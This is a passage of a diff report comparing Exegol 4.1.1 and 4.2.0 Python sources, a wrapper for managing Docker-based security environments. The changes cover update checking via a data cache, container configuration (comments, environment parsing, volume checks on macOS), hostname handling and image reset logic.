             config.addEnv("DISABLE_AUTO_UPDATE", "true")
         # Workspace must be disabled for temporary container because host directory is never deleted
         config.disableDefaultWorkspace()
         name = f"tmp-{binascii.b2a_hex(os.urandom(4)).decode('ascii')}"
         image: ExegolImage = cast(ExegolImage, cls.__loadOrInstallImage(override_image=image_name))
-        model = ExegolContainerTemplate(name, config, image)
+        model = ExegolContainerTemplate(name, config, image, hostname=ParametersManager().hostname)
 
         container = DockerUtils.createContainer(model, temporary=True)
         container.postCreateSetup()
         return container
 
     @classmethod
     def __checkUselessParameters(cls):
@@ -530,19 +553,20 @@
         user_inputs = ParametersManager().parameters.__dict__
         detected = []
         for param in creation_parameters.keys():
             # Skip parameters useful in a start context
             if param in ('containertag',):
                 continue
             # For each parameter, check if it's not None and different from the default
-            if user_inputs.get(param) is not None and \
-                    user_inputs.get(param) != creation_parameters.get(param).kwargs.get('default'):
+            current_option = creation_parameters.get(param)
+            if user_inputs.get(param) is not None and current_option is not None and \
+                    user_inputs.get(param) != current_option.kwargs.get('default'):
                 # If the supplied parameter is positional, getting his printed name
-                name = creation_parameters.get(param).kwargs.get('metavar')
-                if name is None:
+                name = current_option.kwargs.get('metavar')
+                if not name:
                     # if not, using the args name
-                    detected.append(' / '.join(creation_parameters.get(param).args))
+                    detected.append(' / '.join(current_option.args))
                 else:
                     detected.append(name)
         if len(detected) > 0:
             logger.warning(f"These parameters ({', '.join(detected)}) have been entered although the container already "
                            f"exists, they will not be taken into account.")
```

### Comparing `Exegol-4.1.1/exegol/manager/UpdateManager.py` & `Exegol-4.2.0/exegol/manager/UpdateManager.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,32 +1,29 @@
-import os
 import re
-from datetime import datetime, timedelta, date
+from datetime import datetime, timedelta
 from typing import Optional, Dict, cast, Tuple, Sequence
 
 from rich.prompt import Prompt
 
+from exegol.config.ConstantConfig import ConstantConfig
+from exegol.config.DataCache import DataCache
 from exegol.console.ExegolPrompt import Confirm
 from exegol.console.TUI import ExegolTUI
 from exegol.console.cli.ParametersManager import ParametersManager
 from exegol.exceptions.ExegolExceptions import ObjectNotFound, CancelOperation
 from exegol.model.ExegolImage import ExegolImage
 from exegol.model.ExegolModules import ExegolModules
-from exegol.utils.ConstantConfig import ConstantConfig
 from exegol.utils.DockerUtils import DockerUtils
 from exegol.utils.ExeLog import logger, console, ExeLog
 from exegol.utils.GitUtils import GitUtils
 from exegol.utils.WebUtils import WebUtils
 
 
 class UpdateManager:
     """Procedure class for updating the exegol tool and docker images"""
-    __UPDATE_TAG_FILE = ".update.meta"
-    __LAST_CHECK_FILE = ".lastcheck.meta"
-    __TIME_FORMAT = "%d/%m/%Y"
 
     @classmethod
     def updateImage(cls, tag: Optional[str] = None, install_mode: bool = False) -> Optional[ExegolImage]:
         """User procedure to build/pull docker image"""
         # List Images
         image_args = ParametersManager().imagetag
         # Select image
@@ -102,14 +99,17 @@
 
     @classmethod
     def updateWrapper(cls) -> bool:
         """Update wrapper source code from git"""
         result = cls.__updateGit(ExegolModules().getWrapperGit())
         if result:
             cls.__untagUpdateAvailable()
+            logger.empty_line()
+            logger.warning("After this wrapper update, remember to update Exegol [bold]requirements[bold]! ([magenta]python3 -m pip install --upgrade -r requirements.txt[/magenta])")
+            logger.empty_line()
         return result
 
     @classmethod
     def updateImageSource(cls) -> bool:
         """Update image source code from git submodule"""
         return cls.__updateGit(ExegolModules().getSourceGit())
 
@@ -176,51 +176,38 @@
         logger.empty_line()
         return True
 
     @classmethod
     def checkForWrapperUpdate(cls) -> bool:
         """Check if there is an exegol wrapper update available.
         Return true if an update is available."""
+        logger.debug(f"Last wrapper update check: {DataCache().get_wrapper_data().metadata.get_last_check()}")
         # Skipping update check
-        if cls.__triggerUpdateCheck() and not ParametersManager().offline_mode:
+        if DataCache().get_wrapper_data().metadata.is_outdated() and not ParametersManager().offline_mode:
             logger.debug("Running update check")
             return cls.__checkUpdate()
         return False
 
     @classmethod
-    def __triggerUpdateCheck(cls):
-        """Check if an update check must be triggered.
-        Return true to check for new update"""
-        if (ConstantConfig.exegol_config_path / cls.__LAST_CHECK_FILE).is_file():
-            with open(ConstantConfig.exegol_config_path / cls.__LAST_CHECK_FILE, 'r') as metafile:
-                lastcheck = datetime.strptime(metafile.read().strip(), cls.__TIME_FORMAT)
-        else:
-            return True
-        logger.debug(f"Last update check: {lastcheck.strftime(cls.__TIME_FORMAT)}")
-        now = datetime.now()
-        if lastcheck > now:
-            logger.debug("Incoherent last check date detected. Updating metafile.")
-            return True
-        # Check for a new update after at least 15 days
-        time_delta = timedelta(days=15)
-        return (lastcheck + time_delta) < now
-
-    @classmethod
     def __checkUpdate(cls) -> bool:
         """Depending on the current version (dev or latest) the method used to find the latest version is not the same.
         For the stable version, the latest version is fetch from GitHub release.
         In dev mode, git is used to find if there is some update available."""
         isUpToDate = True
+        remote_version = ""
+        current_version = ConstantConfig.version
         with console.status("Checking for wrapper update. Please wait.", spinner_style="blue"):
             if re.search(r'[a-z]', ConstantConfig.version, re.IGNORECASE):
                 # Dev version have a letter in the version code and must check updates via git
                 logger.debug("Checking update using: dev mode")
                 module = ExegolModules().getWrapperGit(fast_load=True)
                 if module.isAvailable:
                     isUpToDate = module.isUpToDate()
+                    remote_version = str(module.get_latest_commit())[:8]
+                    current_version = str(module.get_current_commit())[:8]
                 else:
                     # If Exegol have not been installed from git clone. Auto-check update in this case is only available from mates release
                     logger.verbose("Auto-update checking is not available in the current context")
             else:
                 # If there is no letter, it's a stable release, and we can compare faster with the latest git tag
                 logger.debug("Checking update using: stable mode")
                 try:
@@ -230,23 +217,23 @@
                         raise CancelOperation
                     isUpToDate = cls.__compareVersion(remote_version)
                 except CancelOperation:
                     # No internet, postpone update check
                     return False
 
         if not isUpToDate:
-            cls.__tagUpdateAvailable()
-        cls.__updateLastCheckFile()
+            cls.__tagUpdateAvailable(remote_version, current_version)
+        cls.__updateLastCheckTimestamp()
         return not isUpToDate
 
     @classmethod
-    def __updateLastCheckFile(cls):
-        """Update the .lastcheck.meta file with the current date to avoid multiple update checks."""
-        with open(ConstantConfig.exegol_config_path / cls.__LAST_CHECK_FILE, 'w') as metafile:
-            metafile.write(date.today().strftime(cls.__TIME_FORMAT))
+    def __updateLastCheckTimestamp(cls):
+        """Update the last_check metadata timestamp with the current date to avoid multiple update checks."""
+        DataCache().get_wrapper_data().metadata.update_last_check()
+        DataCache().save_updates()
 
     @classmethod
     def __compareVersion(cls, version) -> bool:
         """Compare a remote version with the current one to check if a new release is available."""
         isUpToDate = True
         try:
             for i in range(len(version.split('.'))):
@@ -256,47 +243,61 @@
                     isUpToDate = False
                     break
         except ValueError:
             logger.warning(f'Unable to parse Exegol version : {version} / {ConstantConfig.version}')
         return isUpToDate
 
     @classmethod
-    def __tagUpdateAvailable(cls):
-        """Create the 'update available' cache file."""
-        if not ConstantConfig.exegol_config_path.is_dir():
-            logger.verbose(f"Creating exegol home folder: {ConstantConfig.exegol_config_path}")
-            os.mkdir(ConstantConfig.exegol_config_path)
-        tag_file = ConstantConfig.exegol_config_path / cls.__UPDATE_TAG_FILE
-        if not tag_file.is_file():
-            with open(tag_file, 'w') as lockfile:
-                lockfile.write(ConstantConfig.version)
+    def __get_current_version(cls):
+        """Get the current version of the exegol wrapper. Handle dev version and release stable version depending on the current version."""
+        current_version = ConstantConfig.version
+        if re.search(r'[a-z]', ConstantConfig.version, re.IGNORECASE):
+            module = ExegolModules().getWrapperGit(fast_load=True)
+            if module.isAvailable:
+                current_version = str(module.get_current_commit())[:8]
+        return current_version
+
+    @staticmethod
+    def display_current_version():
+        """Get the current version of the exegol wrapper. Handle dev version and release stable version depending on the current version."""
+        commit_version = ""
+        if re.search(r'[a-z]', ConstantConfig.version, re.IGNORECASE):
+            module = ExegolModules().getWrapperGit(fast_load=True)
+            if module.isAvailable:
+                commit_version = f" [bright_black]\[{str(module.get_current_commit())[:8]}][/bright_black]"
+        return f"[blue]v{ConstantConfig.version}[blue]{commit_version}"
+
+    @classmethod
+    def __tagUpdateAvailable(cls, latest_version, current_version=None):
+        """Update the 'update available' cache data."""
+        DataCache().get_wrapper_data().last_version = latest_version
+        DataCache().get_wrapper_data().current_version = cls.__get_current_version() if current_version is None else current_version
 
     @classmethod
     def isUpdateTag(cls) -> bool:
         """Check if the cache file is present to announce an available update of the exegol wrapper."""
-        if (ConstantConfig.exegol_config_path / cls.__UPDATE_TAG_FILE).is_file():
-            # Fetch the previously locked version
-            with open(ConstantConfig.exegol_config_path / cls.__UPDATE_TAG_FILE, 'r') as lockfile:
-                locked_version = lockfile.read()
-            # If the current version is the same, no external update had occurred
-            if locked_version == ConstantConfig.version:
-                return True
-            else:
-                # If the version changed, exegol have been updated externally (via pip for example)
-                cls.__untagUpdateAvailable()
-                return False
+        current_version = cls.__get_current_version()
+        wrapper_data = DataCache().get_wrapper_data()
+        # Check if a latest version exist and if the current version is the same, no external update had occurred
+        if wrapper_data.last_version != current_version and wrapper_data.current_version == current_version:
+            return True
         else:
+            # If the version changed, exegol have been updated externally (via pip for example)
+            if wrapper_data.current_version != current_version:
+                cls.__untagUpdateAvailable(current_version)
             return False
 
     @classmethod
-    def __untagUpdateAvailable(cls):
-        """Remove the 'update available' cache file."""
-        tag_file = ConstantConfig.exegol_config_path / cls.__UPDATE_TAG_FILE
-        if tag_file.is_file():
-            os.remove(tag_file)
+    def __untagUpdateAvailable(cls, current_version: Optional[str] = None):
+        """Reset the latest version to the current version"""
+        if current_version is None:
+            current_version = cls.__get_current_version()
+        DataCache().get_wrapper_data().last_version = current_version
+        DataCache().get_wrapper_data().current_version = current_version
+        DataCache().save_updates()
 
     @classmethod
     def __buildSource(cls, build_name: Optional[str] = None) -> str:
         """build user process :
         Ask user is he want to update the git source (to get new& updated build profiles),
         User choice a build name (if not supplied)
         User select a build profile
```

### Comparing `Exegol-4.1.1/exegol/model/ContainerConfig.py` & `Exegol-4.2.0/exegol/model/ContainerConfig.py`

 * *Files 2% similar despite different names*

```diff
@@ -11,18 +11,18 @@
 
 from exegol.console.ConsoleFormat import boolFormatter, getColor
 from exegol.console.ExegolPrompt import Confirm
 from exegol.console.cli.ParametersManager import ParametersManager
 from exegol.exceptions.ExegolExceptions import ProtocolNotSupported, CancelOperation
 from exegol.model.ExegolModules import ExegolModules
 from exegol.utils import FsUtils
-from exegol.utils.EnvInfo import EnvInfo
+from exegol.config.EnvInfo import EnvInfo
 from exegol.utils.ExeLog import logger, ExeLog
 from exegol.utils.GuiUtils import GuiUtils
-from exegol.utils.UserConfig import UserConfig
+from exegol.config.UserConfig import UserConfig
 
 
 class ContainerConfig:
     """Configuration class of an exegol container"""
 
     # Default hardcoded value
     __default_entrypoint_legacy = "bash"
@@ -32,15 +32,16 @@
 
     # Reference static config data
     __static_gui_envs = {"_JAVA_AWT_WM_NONREPARENTING": "1", "QT_X11_NO_MITSHM": "1"}
 
     # Label features (wrapper method to enable the feature / label name)
     __label_features = {"enableShellLogging": "org.exegol.feature.shell_logging"}
     # Label metadata (label name / [wrapper attribute to set the value, getter method to update labels])
-    __label_metadata = {"org.exegol.metadata.creation_date": ["creation_date", "getCreationDate"]}
+    __label_metadata = {"org.exegol.metadata.creation_date": ["creation_date", "getCreationDate"],
+                        "org.exegol.metadata.comment": ["comment", "getComment"]}
 
     def __init__(self, container: Optional[Container] = None):
         """Container config default value"""
         self.__enable_gui: bool = False
         self.__share_timezone: bool = False
         self.__my_resources: bool = False
         self.__my_resources_path: str = "/opt/my-resources"
@@ -64,14 +65,15 @@
         self.__container_command: List[str] = self.__default_cmd
         self.__container_entrypoint: List[str] = self.__default_entrypoint
         self.__vpn_path: Optional[Union[Path, PurePath]] = None
         self.__shell_logging: bool = False
         self.__start_delegate_mode: bool = False
         # Metadata attributes
         self.creation_date: Optional[str] = None
+        self.comment: Optional[str] = None
 
         if container is not None:
             self.__parseContainerConfig(container)
 
     def __parseContainerConfig(self, container: Container):
         """Parse Docker object to setup self configuration"""
         # Container Config section
@@ -300,15 +302,17 @@
         """Procedure to enable GUI feature"""
         if not GuiUtils.isGuiAvailable():
             logger.error("GUI feature is [red]not available[/red] on your environment. [orange3]Skipping[/orange3].")
             return
         if not self.__enable_gui:
             logger.verbose("Config: Enabling display sharing")
             try:
-                self.addVolume(GuiUtils.getX11SocketPath(), "/tmp/.X11-unix", must_exist=True)
+                host_path = GuiUtils.getX11SocketPath()
+                if host_path is not None:
+                    self.addVolume(host_path, GuiUtils.default_x11_path, must_exist=True)
             except CancelOperation as e:
                 logger.warning(f"Graphical interface sharing could not be enabled: {e}")
                 return
             # TODO support pulseaudio
             self.addEnv("DISPLAY", GuiUtils.getDisplayEnv())
             for k, v in self.__static_gui_envs.items():
                 self.addEnv(k, v)
@@ -371,15 +375,15 @@
     def enableMyResources(self):
         """Procedure to enable shared volume feature"""
         # TODO test my resources cross shell source (WSL / PSH) on Windows
         if not self.__my_resources:
             logger.verbose("Config: Enabling my-resources volume")
             self.__my_resources = True
             # Adding volume config
-            self.addVolume(UserConfig().my_resources_path, '/opt/my-resources', enable_sticky_group=True, force_sticky_group=True)
+            self.addVolume(str(UserConfig().my_resources_path), '/opt/my-resources', enable_sticky_group=True, force_sticky_group=True)
 
     def __disableMyResources(self):
         """Procedure to disable shared volume feature (Only for interactive config)"""
         if self.__my_resources:
             logger.verbose("Config: Disabling my-resources volume")
             self.__my_resources = False
             self.removeVolume(container_path='/opt/my-resources')
@@ -409,33 +413,43 @@
             self.removeVolume(container_path='/opt/resources')
 
     def enableShellLogging(self):
         """Procedure to enable exegol shell logging feature"""
         if not self.__shell_logging:
             logger.verbose("Config: Enabling shell logging")
             self.__shell_logging = True
-            self.addLabel(self.__label_features.get('enableShellLogging'), "Enabled")
+            self.addLabel(self.__label_features.get('enableShellLogging', 'org.exegol.error'), "Enabled")
+
+    def addComment(self, comment):
+        """Procedure to add comment to a container"""
+        if not self.comment:
+            logger.verbose("Config: Adding comment to container info")
+            self.comment = comment
+            self.addLabel("org.exegol.metadata.comment", comment)
 
     def __disableShellLogging(self):
         """Procedure to disable exegol shell logging feature"""
         if self.__shell_logging:
             logger.verbose("Config: Disabling shell logging")
             self.__shell_logging = False
-            self.removeLabel(self.__label_features.get('enableShellLogging'))
+            self.removeLabel(self.__label_features.get('enableShellLogging', 'org.exegol.error'))
 
     def enableCwdShare(self):
         """Procedure to share Current Working Directory with the /workspace of the container"""
         self.__workspace_custom_path = os.getcwd()
         logger.verbose(f"Config: Sharing current workspace directory {self.__workspace_custom_path}")
 
     def setWorkspaceShare(self, host_directory):
         """Procedure to share a specific directory with the /workspace of the container"""
         path = Path(host_directory).expanduser().absolute()
-        if not path.is_dir():
-            logger.critical("The specified workspace is not a directory")
+        try:
+            if not path.is_dir() and path.exists():
+                logger.critical("The specified workspace is not a directory!")
+        except PermissionError as e:
+            logger.critical(f"Unable to use the supplied workspace directory: {e}")
         logger.verbose(f"Config: Sharing workspace directory {path}")
         self.__workspace_custom_path = str(path)
 
     def enableVPN(self, config_path: Optional[str] = None):
         """Configure a VPN profile for container startup"""
         # Check host mode : custom (allows you to isolate the VPN connection from the host's network)
         if self.__network_host:
@@ -756,39 +770,42 @@
         Otherwise, a folder will attempt to be created at the specified path.
         if set_sticky_group is set (on a Linux host), the permission setgid will be added to every folder on the volume."""
         # The creation of the directory is ignored when it is a path to the remote drive
         if volume_type == 'bind' and not host_path.startswith("\\\\"):
             path = Path(host_path)
             # TODO extend to docker desktop Windows
             if EnvInfo.isMacHost():
-                match = False
                 # Add support for /etc
                 path_match = str(path)
                 if path_match.startswith("/etc/"):
+                    if EnvInfo.isOrbstack():
+                        raise CancelOperation(f"Orbstack doesn't support sharing /etc files with the container")
                     path_match = path_match.replace("/etc/", "/private/etc/")
-                # Find a match
-                for resource in EnvInfo.getDockerDesktopResources():
-                    if path_match.startswith(resource):
-                        match = True
-                        break
-                if not match:
-                    logger.critical(f"Bind volume from {host_path} is not possible, Docker Desktop configuration is incorrect. "
-                                    f"A parent directory must be shared in "
-                                    f"[magenta]Docker Desktop > Preferences > Resources > File Sharing[/magenta].")
+                if EnvInfo.isDockerDesktop():
+                    match = False
+                    # Find a match
+                    for resource in EnvInfo.getDockerDesktopResources():
+                        if path_match.startswith(resource):
+                            match = True
+                            break
+                    if not match:
+                        logger.critical(f"Bind volume from {host_path} is not possible, Docker Desktop configuration is incorrect. "
+                                        f"A parent directory must be shared in "
+                                        f"[magenta]Docker Desktop > Preferences > Resources > File Sharing[/magenta].")
             # Choose to update fs directory perms if available and depending on user choice
             # if force_sticky_group is set, user choice is bypassed, fs will be updated.
             execute_update_fs = force_sticky_group or (enable_sticky_group and (UserConfig().auto_update_workspace_fs ^ ParametersManager().update_fs_perms))
             try:
                 if not (path.is_file() or path.is_dir()):
                     if must_exist:
                         raise CancelOperation(f"{host_path} does not exist on your host.")
                     else:
                         # If the directory is created by exegol, bypass user preference and enable shared perms (if available)
                         execute_update_fs = force_sticky_group or enable_sticky_group
-                        os.makedirs(host_path, exist_ok=True)
+                        path.mkdir(exist_ok=True)
             except PermissionError:
                 logger.error("Unable to create the volume folder on the filesystem locally.")
                 logger.critical(f"Insufficient permissions to create the folder: {host_path}")
             except FileExistsError:
                 # The volume targets a file that already exists on the file system
                 pass
             # Update FS don't work on Windows and only for directory
@@ -818,15 +835,20 @@
             elif mode == "ro":
                 readonly = True
             else:
                 logger.error(f"Error on volume config, mode: {mode} not recognized.")
                 readonly = False
             logger.debug(
                 f"Adding a volume from '{host_path}' to '{container_path}' as {'readonly' if readonly else 'read/write'}")
-            self.addVolume(host_path, container_path, readonly)
+            try:
+                self.addVolume(host_path, container_path, readonly)
+            except CancelOperation as e:
+                logger.error(f"The following volume couldn't be created [magenta]{volume_string}[/magenta]. {e}")
+                if not Confirm("Do you want to continue without this volume ?", False):
+                    exit(0)
         else:
             logger.critical(f"Volume '{volume_string}' cannot be parsed. Exiting.")
 
     def removeVolume(self, host_path: Optional[str] = None, container_path: Optional[str] = None) -> bool:
         """Remove a volume from the container configuration (Only before container creation)"""
         if host_path is None and container_path is None:
             # This is a dev problem
@@ -895,26 +917,35 @@
             return True
         except KeyError:
             # When the Key is not present in the dictionary
             return False
 
     def addRawEnv(self, env: str):
         """Parse and add an environment variable from raw user input"""
-        env_args = env.split('=')
-        if len(env_args) < 2:
-            logger.critical(f"Incorrect env syntax ({env}). Please use this format: KEY=value")
-        key = env_args[0]
-        value = '='.join(env_args[1:])
-        logger.debug(f"Adding env {key}={value}")
+        key, value = self.__parseUserEnv(env)
         self.addEnv(key, value)
 
     def getEnvs(self) -> Dict[str, str]:
         """Envs config getter"""
         return self.__envs
 
+    @classmethod
+    def __parseUserEnv(cls, env: str) -> Tuple[str, str]:
+        env_args = env.split('=')
+        key = env_args[0]
+        if len(env_args) < 2:
+            value = os.getenv(env, '')
+            if not value:
+                logger.critical(f"Incorrect env syntax ({env}). Please use this format: KEY=value")
+            else:
+                logger.success(f"Using system value for env {env}.")
+        else:
+            value = '='.join(env_args[1:])
+        return key, value
+
     def getShellEnvs(self) -> List[str]:
         """Overriding envs when opening a shell"""
         result = []
         if self.__enable_gui:
             current_display = GuiUtils.getDisplayEnv()
             # If the default DISPLAY environment in the container is not the same as the DISPLAY of the user's session,
             # the environment variable will be updated in the exegol shell.
@@ -923,18 +954,17 @@
                 # but exegol can be launched from remote access via ssh with X11 forwarding
                 # (Be careful, an .Xauthority file may be needed).
                 result.append(f"DISPLAY={current_display}")
         # Overwrite env from user parameters
         user_envs = ParametersManager().envs
         if user_envs is not None:
             for env in user_envs:
-                if len(env.split('=')) < 2:
-                    logger.critical(f"Incorrect env syntax ({env}). Please use this format: KEY=value")
+                key, value = self.__parseUserEnv(env)
                 logger.debug(f"Add env to current shell: {env}")
-                result.append(env)
+                result.append(f"{key}={value}")
         return result
 
     def addLabel(self, key: str, value: str):
         """Add a custom label to the container configuration"""
         self.__labels[key] = value
 
     def removeLabel(self, key: str) -> bool:
@@ -946,15 +976,17 @@
             # When the Key is not present in the dictionary
             return False
 
     def getLabels(self) -> Dict[str, str]:
         """Labels config getter"""
         # Update metadata (from getter method) to the labels (on container creation)
         for label_name, refs in self.__label_metadata.items():
-            self.addLabel(label_name, getattr(self, refs[1])())
+            data = getattr(self, refs[1])()
+            if data is not None:
+                self.addLabel(label_name, data)
         return self.__labels
 
     def getCreationDate(self) -> str:
         """Get container creation date.
         If the creation has not been set before, init as right now."""
         if self.creation_date is None:
             self.creation_date = datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')
@@ -1034,14 +1066,19 @@
     def getTextCreationDate(self) -> str:
         """Get the container creation date.
         If the creation date has not been supplied on the container, return empty string."""
         if self.creation_date is None:
             return ""
         return datetime.strptime(self.creation_date, "%Y-%m-%dT%H:%M:%SZ").strftime("%d/%m/%Y %H:%M")
 
+    def getComment(self) -> Optional[str]:
+        """Get the container comment. 
+        If no comment has been supplied, returns None."""
+        return self.comment
+
     def getTextMounts(self, verbose: bool = False) -> str:
         """Text formatter for Mounts configurations. The verbose mode does not exclude technical volumes."""
         result = ''
         for mount in self.__mounts:
             # Blacklist technical mount
             if not verbose and mount.get('Target') in ['/tmp/.X11-unix', '/opt/resources', '/etc/localtime',
                                                        '/etc/timezone', '/my-resources', '/opt/my-resources']:
```

### Comparing `Exegol-4.1.1/exegol/model/ExegolContainer.py` & `Exegol-4.2.0/exegol/model/ExegolContainer.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,22 +1,21 @@
-import base64
 import os
 import shutil
 from typing import Optional, Dict, Sequence, Tuple
 
 from docker.errors import NotFound, ImageNotFound
 from docker.models.containers import Container
 
 from exegol.console.ExegolPrompt import Confirm
 from exegol.console.cli.ParametersManager import ParametersManager
 from exegol.model.ContainerConfig import ContainerConfig
 from exegol.model.ExegolContainerTemplate import ExegolContainerTemplate
 from exegol.model.ExegolImage import ExegolImage
 from exegol.model.SelectableInterface import SelectableInterface
-from exegol.utils.EnvInfo import EnvInfo
+from exegol.config.EnvInfo import EnvInfo
 from exegol.utils.ExeLog import logger, console
 
 
 class ExegolContainer(ExegolContainerTemplate, SelectableInterface):
     """Class of an exegol container already create in docker"""
 
     def __init__(self, docker_container: Container, model: Optional[ExegolContainerTemplate] = None):
@@ -34,25 +33,27 @@
                 logger.warning(f"Some images were forcibly removed by docker when they were used by existing containers!")
                 logger.error(f"The '{docker_container.name}' containers might not work properly anymore and should also be deleted and recreated with a new image.")
                 docker_image = None
                 image_name = "[red bold]BROKEN[/red bold]"
             # Create Exegol container from an existing docker container
             super().__init__(docker_container.name,
                              config=ContainerConfig(docker_container),
-                             image=ExegolImage(name=image_name, docker_image=docker_image))
+                             image=ExegolImage(name=image_name, docker_image=docker_image),
+                             hostname=docker_container.attrs.get('Config', {}).get('Hostname'))
             self.image.syncContainerData(docker_container)
             # At this stage, the container image object has an unknown status because no synchronization with a registry has been done.
             # This could be done afterwards (with container.image.autoLoad()) if necessary because it takes time.
             self.__new_container = False
         else:
             # Create Exegol container from a newly created docker container with its object template.
             super().__init__(docker_container.name,
                              config=ContainerConfig(docker_container),
                              # Rebuild config from docker object to update workspace path
-                             image=model.image)
+                             image=model.image,
+                             hostname=model.hostname)
             self.__new_container = True
         self.image.syncStatus()
 
     def __str__(self):
         """Default object text formatter, debug only"""
         return f"{self.getRawStatus()} - {super().__str__()}"
 
@@ -199,24 +200,24 @@
                 # Docker volume defines from WSL don't return the real path, they cannot be automatically removed
                 # TODO review WSL workspace volume
                 logger.warning("Warning: WSL workspace directory cannot be removed automatically.")
                 return
             logger.verbose("Removing workspace volume")
             logger.debug(f"Removing volume {volume_path}")
             try:
-                is_file_present = os.listdir(volume_path)
+                list_files = os.listdir(volume_path)
             except PermissionError:
                 if Confirm(f"Insufficient permission to view workspace files {volume_path}, "
                            f"do you still want to delete them?", default=False):
-                    # Set is_file_present as false to skip user prompt again
-                    is_file_present = False
+                    # Set list_files as empty to skip user prompt again
+                    list_files = []
                 else:
                     return
             try:
-                if is_file_present:
+                if len(list_files) > 0:
                     # Directory is not empty
                     if not Confirm(f"Workspace [magenta]{volume_path}[/magenta] is not empty, do you want to delete it?",
                                    default=False):
                         # User can choose not to delete the workspace on the host
                         return
                 # Try to remove files from the host with user permission (work only without sub-directory)
                 shutil.rmtree(volume_path)
@@ -252,15 +253,17 @@
         """
         If GUI is enabled, allow X11 access on host ACL (if not already allowed) for linux and mac.
         On Windows host, WSLg X11 don't have xhost ACL.
         :return:
         """
         if self.config.isGUIEnable() and not self.__xhost_applied and not EnvInfo.isWindowsHost():
             self.__xhost_applied = True  # Can be applied only once per execution
-            logger.debug(f"Adding xhost ACL to local:{self.hostname}")
+
             if EnvInfo.isMacHost():
+                logger.debug(f"Adding xhost ACL to localhost")
                 # add xquartz inet ACL
                 with console.status(f"Starting XQuartz...", spinner_style="blue"):
                     os.system(f"xhost + localhost > /dev/null")
             else:
+                logger.debug(f"Adding xhost ACL to local:{self.hostname}")
                 # add linux local ACL
                 os.system(f"xhost +local:{self.hostname} > /dev/null")
```

### Comparing `Exegol-4.1.1/exegol/model/ExegolImage.py` & `Exegol-4.2.0/exegol/model/ExegolImage.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,50 +1,52 @@
 from datetime import datetime
 from typing import Optional, List, Dict, Any, Union
 
 from docker.models.containers import Container
 from docker.models.images import Image
 
+from exegol.config.DataCache import DataCache
 from exegol.console import ConsoleFormat
 from exegol.console.cli.ParametersManager import ParametersManager
 from exegol.model.MetaImages import MetaImages
 from exegol.model.SelectableInterface import SelectableInterface
-from exegol.utils.ConstantConfig import ConstantConfig
-from exegol.utils.EnvInfo import EnvInfo
+from exegol.config.ConstantConfig import ConstantConfig
+from exegol.config.EnvInfo import EnvInfo
 from exegol.utils.ExeLog import logger, ExeLog, console
 from exegol.utils.WebUtils import WebUtils
 
 
 class ExegolImage(SelectableInterface):
     """Class of an exegol image. Container every information about the docker image."""
 
     def __init__(self,
                  name: str = "NONAME",
                  dockerhub_data: Optional[Dict[str, Any]] = None,
-                 meta_img: MetaImages = None,
+                 meta_img: Optional[MetaImages] = None,
                  image_id: Optional[str] = None,
                  docker_image: Optional[Image] = None,
                  isUpToDate: bool = False):
         """Docker image default value"""
         # Prepare parameters
         if meta_img:
             version_parsed = meta_img.version
             name = meta_img.name
             self.__version_specific: bool = not meta_img.is_latest
         else:
             version_parsed = MetaImages.tagNameParsing(name)
             self.__version_specific = bool(version_parsed)
         # Init attributes
-        self.__image: Image = docker_image
+        self.__image: Optional[Image] = docker_image
         self.__name: str = name
         self.__alt_name: str = ''
         self.__arch = ""
         self.__entrypoint: Optional[Union[str, List[str]]] = None
         # Latest version available of the current image (or current version if version specific)
         self.__profile_version: str = version_parsed if version_parsed else "[bright_black]N/A[/bright_black]"
+        self.__profile_digest: str = ""
         # Version of the docker image installed
         self.__image_version: str = self.__profile_version
         # This mode allows to know if the version has been retrieved from the tag and is part of the image name or
         # if it is retrieved from the tags (ex: nightly)
         self.__version_label_mode: bool = False
         self.__build_date = "[bright_black]N/A[/bright_black]"
         # Remote image size
@@ -74,24 +76,25 @@
                 self.__dl_size = self.__processSize(dockerhub_data.get("size", 0))
             if meta_img:
                 self.__setDigest(meta_img.meta_id)
         logger.debug(f"└── {self.__name}\t→ ({self.getType()}) {self.__digest}")
 
     def __initFromDockerImage(self):
         """Parse Docker object to set up self configuration on creation."""
+        assert self.__image is not None
         # If docker object exists, image is already installed
         self.__is_install = True
         # Set init values from docker object
         if len(self.__image.attrs["RepoTags"]) > 0:
             # Tag as outdated until the latest tag is found
             self.__outdated = True
             # Tag as a version specific until the latest tag is found
             self.__version_specific = True
             name = self.__name  # Init with old name
-            self.__name = None
+            self.__name = ""
             for repo_tag in self.__image.attrs["RepoTags"]:
                 repo, name = repo_tag.split(':')
                 if not repo.startswith(ConstantConfig.IMAGE_NAME):
                     # Ignoring external images (set container using external image as outdated)
                     continue
                 version_parsed = MetaImages.tagNameParsing(name)
                 # Check if a non-version tag (the latest tag) is supplied, if so, this image must NOT be removed
@@ -99,15 +102,15 @@
                     self.__outdated = False
                     self.__version_specific = False
                     self.__name = name
                 else:
                     self.__setImageVersion(version_parsed)
 
             # if no version has been found, restoring previous name
-            if self.__name is None:
+            if not self.__name:
                 self.__name = name
 
             if self.isVersionSpecific():
                 if "N/A" in self.__image_version:
                     logger.debug(f"Current '{self.__name}' image is version specific but no version tag were found!")
                 else:
                     self.__profile_version = self.__image_version
@@ -128,28 +131,45 @@
         # If this image is remote, set digest ID
         self.__is_remote = not (len(self.__image.attrs["RepoDigests"]) == 0 and self.__checkLocalLabel())
         if self.__is_remote:
             self.__setDigest(self.__parseDigest(self.__image))
         # Default status, must be refreshed later if some parameters will be changed externally
         self.syncStatus()
 
+    def resetDockerImage(self):
+        """During an image upgrade, the docker image and local parsed variable must be
+        reset before parsing the new upgraded image"""
+        self.__image = None
+        self.__image_version = "[bright_black]N/A[/bright_black]"
+        self.__digest = "[bright_black]N/A[/bright_black]"
+        self.__image_id = "Reseted"
+        self.__build_date = "[bright_black]N/A[/bright_black]"
+        self.__disk_size = "[bright_black]N/A[/bright_black]"
+
     def setDockerObject(self, docker_image: Image):
         """Docker object setter. Parse object to set up self configuration."""
         self.__image = docker_image
         # When a docker image exist, image is locally installed
         self.__is_install = True
         # Set real size on disk
         self.__setRealSize(self.__image.attrs["Size"])
         self.__entrypoint = self.__image.attrs.get("Config", {}).get("Entrypoint")
         # Set local image ID
         self.__setImageId(docker_image.attrs["Id"])
         # Set build date from labels
         self.__build_date = self.__image.labels.get('org.exegol.build_date', '[bright_black]N/A[/bright_black]')
         # Check if local image is sync with remote digest id (check up-to-date status)
-        self.__is_update = self.__digest == self.__parseDigest(docker_image)
